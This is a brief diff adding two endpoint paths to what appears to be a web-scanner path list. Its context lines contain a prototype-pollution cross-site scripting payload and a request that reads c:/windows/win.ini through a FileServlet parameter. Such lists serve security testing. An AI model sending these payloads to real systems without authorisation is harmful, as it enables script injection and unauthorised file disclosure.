@@ -100,3 +100,5 @@
 /?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
 /oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini
 /dashboard/snapshot/:key
+/rest/users/1
+/live_mfg.html
